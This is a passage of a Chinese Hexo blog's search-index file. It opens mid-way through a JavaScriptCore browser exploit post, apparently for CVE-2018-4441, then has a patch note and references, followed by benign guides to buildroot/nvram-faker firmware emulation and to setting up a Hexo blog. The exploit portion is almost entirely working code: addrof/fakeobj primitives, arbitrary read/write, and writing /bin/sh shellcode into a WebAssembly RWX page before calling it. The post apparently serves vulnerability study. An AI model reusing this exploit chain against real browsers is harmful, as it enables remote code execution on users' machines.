function_">toString</span>(<span class="hljs-number">16</span>))<br><br>i32[<span class="hljs-number">0</span>]=<span class="hljs-number">100</span>;<br>i32[<span class="hljs-number">1</span>]=<span class="hljs-number">0x01082107</span> - <span class="hljs-number">0x10000</span>;<br><span class="hljs-keyword">var</span> container=&#123;<br>    <span class="hljs-attr">jscell</span>:f64[<span class="hljs-number">0</span>],<br>    <span class="hljs-attr">butterfly</span>:victim,<br>&#125;<br><span class="hljs-title function_">print</span>(<span class="hljs-title function_">describe</span>(container))<br>container_addr = <span class="hljs-title function_">addrof</span>(container);<br>hax = <span class="hljs-title function_">fakeobj</span>(container_addr+<span class="hljs-number">0x10</span>);<br><br><span class="hljs-keyword">var</span> unboxed2 = [<span class="hljs-number">1.1</span>];<br>unboxed2[<span class="hljs-number">0</span>] =<span class="hljs-number">3.3</span>;<br><br><span class="hljs-keyword">var</span> boxed2 = [&#123;&#125;]<br><br>hax[<span class="hljs-number">1</span>] = <span class="hljs-title function_">i2f</span>(<span class="hljs-title function_">addrof</span>(unboxed2))<br><span class="hljs-keyword">var</span> shared = victim[<span class="hljs-number">1</span>];<br>hax[<span class="hljs-number">1</span>] = <span class="hljs-title function_">i2f</span>(<span class="hljs-title function_">addrof</span>(boxed2))<br>victim[<span class="hljs-number">1</span>] = shared;<br><br><span class="hljs-keyword">var</span> stage2=&#123;<br>    <span class="hljs-attr">addrof</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">obj</span>)&#123;<br>        boxed2[<span class="hljs-number">0</span>] = obj;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">f2i</span>(unboxed2[<span class="hljs-number">0</span>]);<br>    &#125;,<br>    <span class="hljs-attr">fakeobj</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">addr</span>)&#123;<br>        unboxed2[<span class="hljs-number">0</span>] = <span class="hljs-title function_">i2f</span>(addr);<br>        <span class="hljs-keyword">return</span> boxed2[<span class="hljs-number">0</span>];<br>    &#125;,<br>    <span class="hljs-attr">read64</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">addr</span>)&#123;<br>        hax[<span class="hljs-number">1</span>] = <span class="hljs-title function_">i2f</span>(addr + <span class="hljs-number">0x10</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addrof</span>(victim.<span class="hljs-property">prop</span>);<br>    &#125;,<br>    <span class="hljs-attr">write64</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">addr,data</span>)&#123;<br>        hax[<span class="hljs-number">1</span>] = <span class="hljs-title function_">i2f</span>(addr+<span class="hljs-number">0x10</span>);<br>        victim.<span class="hljs-property">prop</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fakeobj</span>(data)<br>    &#125;,<br>    <span class="hljs-attr">write</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">addr, shellcode</span>) &#123;<br>        <span class="hljs-keyword">var</span> theAddr = addr;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;shellcode.<span class="hljs-property">length</span>;i++)&#123;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">write64</span>(addr+i,shellcode[i].<span class="hljs-title function_">charCodeAt</span>())<br>        &#125;<br>    &#125;,<br>    <span class="hljs-attr">pwn</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">var</span> wasm_code = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<br>        <span class="hljs-keyword">var</span> wasm_mod = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasm_code);<br>        <span class="hljs-keyword">var</span> wasm_instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(wasm_mod);<br>        <span class="hljs-keyword">var</span> f = wasm_instance.<span class="hljs-property">exports</span>.<span class="hljs-property">main</span>;<br>        <span class="hljs-keyword">var</span> addr_f = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addrof</span>(f);<br>        <span class="hljs-keyword">var</span> addr_p = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">read64</span>(addr_f + <span class="hljs-number">0x40</span>);<br>        <span class="hljs-keyword">var</span> addr_shellcode = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">read64</span>(addr_p);<br>        <span class="hljs-title function_">print</span>(addr_f.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br>        <span class="hljs-title function_">print</span>(addr_p.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br>        <span class="hljs-title function_">print</span>(addr_shellcode.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>        shellcode = <span class="hljs-string">&quot;j;X\x99RH\xbb//bin/shST_RWT^\x0f\x05&quot;</span><br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">write</span>(addr_shellcode, shellcode);<br>        <span class="hljs-title function_">f</span>();<br>    &#125;<br>&#125;<br><br>stage2.<span class="hljs-title function_">pwn</span>()<br></code></pre></td></tr></table></figure><h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p>由于上面的漏洞类似于代码写错导致的，所以删除<code>this-&gt;structure(vm)-&gt;holesMustForwardToPrototype(vm, this)</code>即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">if</span> (storage-&gt;<span class="hljs-built_in">hasHoles</span>()) <br>    || <span class="hljs-built_in">hasSparseMap</span>() <br>    || <span class="hljs-built_in">shouldUseSlowPut</span>(<span class="hljs-built_in">indexingType</span>())) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>下面主要是针对wasm的利用，特别是第三个参考中提到如何去找wasm的rwx地址，比如先打印出来wasm实例的地址，然后利用调试器搜寻<code>RWX</code>的内存，查看wasm实例地址附近是否有<code>RWX内存</code>的地址，算wasm地址和内存页之间的差值：</p><blockquote><p><a href="https://devilx86.github.io/writeups/CVE-2018-4441/">利用 Webkit 漏洞 CVE-2018-4441 |魔鬼x86 — Exploiting Webkit CVE-2018-4441 | Devilx86</a></p><p><a href="https://x3h1n.github.io/2020/06/21/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/">浏览器漏洞利用基础 | X3h1n</a></p><p><a href="https://jhalon.github.io/chrome-browser-exploitation-3/">Chrome 浏览器漏洞利用，第 3 部分：分析和利用 CVE-2018-17463 - Jack Hacks — Chrome Browser Exploitation, Part 3: Analyzing and Exploiting CVE-2018-17463 - Jack Hacks (jhalon.github.io)</a></p><p>下面这个适合看类之间的关系：</p><p><a href="https://doxywizerd.github.io/webkit/class_j_s_c_1_1_j_s_array.html">webkit: JSC::JSArray Class Reference (doxywizerd.github.io)</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>浏览器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JSC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IoT--buildroot&amp;nvram</title>
    <link href="/2022/08/01/IoT-buildroot-nvram/"/>
    <url>/2022/08/01/IoT-buildroot-nvram/</url>
    
    <content type="html"><![CDATA[<h1 id="buildroot-nvram-faker"><a href="#buildroot-nvram-faker" class="headerlink" title="buildroot&amp;nvram_faker"></a>buildroot&amp;nvram_faker</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在搭建路由器运行环境时，由于有些路由器固件运行时需要调用nvram相关函数，虽然固件中自带nvram相关的动态库，但是nvram是硬件上的东西最终会调用失败，为了让固件运行起来，我们需要对nvram相关函数进行劫持。所以就需要我们自己编译一个nvram相关的库，编译时就需要对应架构的交叉编译器，可以用buildroot得到。nvram_faker就可以帮助我们劫持对应的函数，内容自定，然后用交叉编译器编译nvram_faker成动态库。</p><h2 id="buildroot"><a href="#buildroot" class="headerlink" title="buildroot"></a>buildroot</h2><p>buildroot 是Linux平台上一个构建嵌入式Linux系统的框架。整个Buildroot是由Makefile脚本和Kconfig配置文件构成的。你可以和编译Linux内核一样，通过buildroot配置，menuconfig修改，编译出一个完整的可以直接烧写到机器上运行的Linux系统软件(包含boot、kernel、rootfs以及rootfs中的各种库和应用程序)。</p><p>下载链接</p><blockquote><p>最新版：<a href="https://buildroot.org/download.html">https://buildroot.org/download.html</a></p><p>历史版本：<a href="https://buildroot.org/downloads/">https://buildroot.org/downloads/</a></p></blockquote><h3 id="一些术语"><a href="#一些术语" class="headerlink" title="一些术语"></a>一些术语</h3><blockquote><p>交叉编译器（Cross-Compiler）：它可以在一个平台（主机）上将源代码编译成另一个平台（目标）的可执行代码。</p><p>交叉链接器（Cross-Linker）：它可以链接在主机上编译的目标代码，并生成可以在目标平台上运行的可执行文件。</p><p>库（Libraries）：这些是预编译的代码块，它们可以被链接到你的程序中，以提供一些通用的功能。交叉编译工具链应包含可以在目标平台上运行的库。</p><p>头文件（Header Files）：这些文件包含源代码中使用的函数、变量和数据结构的定义。头文件应该是针对目标平台的。</p><p>调试器（Debugger）：在开发过程中，调试器用于测试和调试在主机上编译，但在目标平台上运行的代码。</p><p>二进制工具（Binutils）：这些工具用于处理目标平台的二进制文件。它们包括诸如 objdump（用于显示二进制文件信息）、readelf（用于显示 ELF 文件信息）等工具。</p><p>host(宿主机)和target(目标机)：例如，如果你正在一个 x86 架构的 Linux 系统上开发，而你的目标平台是 ARM 架构的嵌入式设备，你就可能需要一个交叉编译工具链。你可以使用 GCC 构建这样一个工具链，它包括 ARM 交叉编译器 (arm-linux-gnueabi-gcc)，交叉链接器 (arm-linux-gnueabi-ld)，ARM 库，以及适用于 ARM 平台的头文件。对于上面的例子，X86架构的Linux系统即为宿主系统(host system)，其运行的编译器有两种，本地编译器(the regular compilation toolchain)和交叉编译器(the cross-compilation toolchain)，它们都运行在宿主系统(x86-linux)中，但前者用于生成在宿主机上运行的二进制文件，后者用于生成在目标机(target system)上运行的程序。target文件夹内是可以直接在目标设备上运行的程序，host是存有交叉编译工具链的，运行平台就是我们运行buildroot所在的平台。</p></blockquote><h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><p>比如下面是先下载、解压、然后准备配置</p><blockquote><p>wget <a href="https://buildroot.org/downloads/buildroot-2022.05.tar.xz">https://buildroot.org/downloads/buildroot-2022.05.tar.xz</a><br>tar xf buildroot-2022.05.tar.xz<br>cd buildroot-2022.05&#x2F;<br>make menuconfig</p></blockquote><p>下面是配置：</p><ul><li><p>Target options -&gt; Target Architecture -&gt; 选择cpu架构（ARC、ARM、MIPS、PowerPC等等）</p><p>这里是选择对应的cpu架构，比如路由器的架构有的是MIPS，有的是ARM<img src="/2022/08/01/IoT-buildroot-nvram/image-20240830121040275.png"></p></li><li><p>Toolchain -&gt; Kernel Headers选择内核版本</p><p>一般是将”kernel headers”改成自己主机上的Linux版本（即运行该编译器的主机）<img src="/2022/08/01/IoT-buildroot-nvram/image-20240830121129966.png"></p></li></ul><p>​当然也可以在Toolchain配置C Library，这个是按需求</p><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>在编译之前为了保证不出错，需要进行<code>make clean</code>。当然在我们编译好之后，我们最好先将编译产物单独存起来。</p><p>可以<code>make</code> 也可以 <code>make -j4</code> 使用4线程编译</p><blockquote><p>编译产物在output&#x2F;下面：</p><p>host&#x2F;bin下存有交叉编译工具链</p><p>target下是能在目标设备上直接运行的程序</p></blockquote><h2 id="nvram-faker"><a href="#nvram-faker" class="headerlink" title="nvram_faker"></a>nvram_faker</h2><p>在使用模拟环境运行嵌入式Linux固件中的应用程序，如无线路由器的Web服务器时，一个常见问题是应用尝试从NVRAM中读取配置参数。当没有真正的NVRAM时，这些调用会失败，导致应用无法正常启动。为此，我们带来了一个巧妙的解决方案——<code>nvram-faker</code>。<code>nvram-faker</code>是一个轻量级库，利用<code>LD_PRELOAD</code>技术拦截对<code>libnvram.so</code>的调用。通过提供一个类似INI文件格式的配置，它可以模拟NVRAM，并为查询返回合理的值，从而让目标应用能够启动并运行。</p><blockquote><p><a href="https://github.com/zcutlip/nvram-faker">zcutlip&#x2F;nvram-faker：一个简单的库，用于在模拟环境中运行嵌入式 Linux 应用程序时拦截对 libnvram 的调用。 — zcutlip&#x2F;nvram-faker: A simple library to intercept calls to libnvram when running embedded linux applications in emulated environments. (github.com)</a></p></blockquote><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>我们可以在nvram.ini文件中配置参数</p><p><img src="/2022/08/01/IoT-buildroot-nvram/image-20240830134942256.png"></p><p>如果我们想要增加对应的nvram函数，可以通过nvram_faker.c和nvram_faker.h文件。比如下面自带的nvram_get函数：</p><p><img src="/2022/08/01/IoT-buildroot-nvram/image-20240830135140792.png"></p><h3 id="编译-1"><a href="#编译-1" class="headerlink" title="编译"></a>编译</h3><p>上面我们构建好了交叉编译工具链，在nvram_faker中根据不同的架构使用不同的脚本来获取交叉编译器的路径，如果脚本找不到可能需要我们进行手动添加路径：</p><p><img src="/2022/08/01/IoT-buildroot-nvram/image-20240830135430318.png"></p><p>如果直接make，就会默认编译为共享库：</p><p><img src="/2022/08/01/IoT-buildroot-nvram/image-20240830135725515.png"></p><p>注意程序中写的ini文件的路径是<code>./nvram.ini</code>，所以想要共享库正常运行，需要将<code>nvram.ini</code>文件放在和共享库一个目录下，一般都是放在固件的根目录下。当然我们也可以更改路径：</p><p><img src="/2022/08/01/IoT-buildroot-nvram/image-20240830135858537.png"></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>在编译好<code>libnvram-faker.so</code>后，将其与<code>nvram.ini</code>文件移动到合适的位置后，使用<code>LD_PRELOAD</code>来预加载我们编译好的库。</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博客搭建</title>
    <link href="/2022/04/25/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/04/25/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="预准备"><a href="#预准备" class="headerlink" title="预准备"></a>预准备</h1><p>就是在电脑上安装一些所需的软件</p><ul><li><p>Git</p><p>根据不同的系统有不同的安装方式，可以根据自己的系统来，我这里是用Mac</p><p><code> brew install git </code></p></li><li><p>Node.js</p><p>也是有多种不同的方式，比如MacOS可以用homebrew</p><p><code> brew install node </code></p></li><li><p>Hexo</p><p>安装好Node.js后，使用下面指令来安装hexo</p><p><code> npm install -g hexo-cli </code></p><p>安装过程中可能会遇到网络问题，这时换下国内镜像源即可，下面是淘宝镜像</p><p><code> npm config set registry https://registry.npmmirror.com</code></p></li></ul><h1 id="初步使用Hexo"><a href="#初步使用Hexo" class="headerlink" title="初步使用Hexo"></a>初步使用Hexo</h1><ul><li><p>找一个位置创建我们的博客文件夹</p><p><code> mkdir Blog </code></p></li><li><p>进入Blog文件夹，使用hexo进行初始化</p><p><code> cd Blog </code></p><p><code> hexo init </code></p></li><li><p>这时已经初始化完成，可以使用下面指令测试一下</p><p><code> hexo s </code>打开server</p><p>在网页中http:&#x2F;&#x2F;localhost:4000进行访问，如果显示blog就正常</p></li><li><p>下载主题</p><p>正常如果是自己下载主题，需要将主题放在themes文件夹内</p><p>详情就是根据主题提供的方式来，这里我使用的是<a href="https://github.com/fluid-dev/hexo-theme-fluid">Fluid主题</a>，所以使用npm安装<br><code> npm install --save hexo-theme-fluid</code><br>这样就会将hexo-theme-fluid安装到node_moudles文件夹内，当然还要同时创建一个对应主题的配置文件</p></li><li><p>配置主题<br>主要是_config.yml来掌控整个配置，比如选用哪个主题等等<br>具体主题还要有其对应的配置文件，比如这里是fluid的配置文件：_config.fluid.yml</p></li></ul><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><h2 id="github的配置"><a href="#github的配置" class="headerlink" title="github的配置"></a>github的配置</h2><ul><li><p>创建一个githubPages仓库并进行相关设置</p></li><li><p>电脑端设置github的用户名和邮箱并生成rsa<br><code>git config --global user.name &quot;github用户名&quot;</code><br><code>git config --global user.email &quot;github注册的邮箱&quot;</code><br><code>ssh-keygen -t rsa -C &quot;github注册的邮箱&quot;</code>    </p></li><li><p>将本机生成的rsa设置到github仓库的上面<br><code>cat ~/.ssh/id_rsa.pub</code>将内容复制，进入github个人Settings中，SSH and GPG keys里面新建一个SSH keys粘贴进去即可</p></li><li><p>配置_config.yml，这里配置仓库链接时要注意使用ssh的形式，而不是https<br>在最下面添加:</p><blockquote></blockquote><pre><code class="hljs">deploy:        type: git        repository: 自己的仓库地址，选用ssh的那个        branch: main</code></pre></li></ul><h2 id="hexo生成相关的指令"><a href="#hexo生成相关的指令" class="headerlink" title="hexo生成相关的指令"></a>hexo生成相关的指令</h2><ul><li><p>如果之前存在生成的旧版本，先clean一下<br><code>hexo clean</code></p></li><li><p>先在Blog内进行生成<br><code>hexo g</code>是用来generate的，会对应生成一个public文件夹，一会是将该文件夹内的内容传至github</p></li><li><p>准备进行上传至github<br><code>hexo d</code>是用来deploy的，会根据_config.yml配置进行上传至github上面</p></li></ul><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>格式如下：</p><pre><code class="hljs">password: ******message: Pwn!!!</code></pre><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h2><pre><code class="hljs">#这个不显示图片参考：https://zhuanlan.zhihu.com/p/392900486?utm_id=0#解决：https://blog.csdn.net/McNeeley/article/details/131276010</code></pre><h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
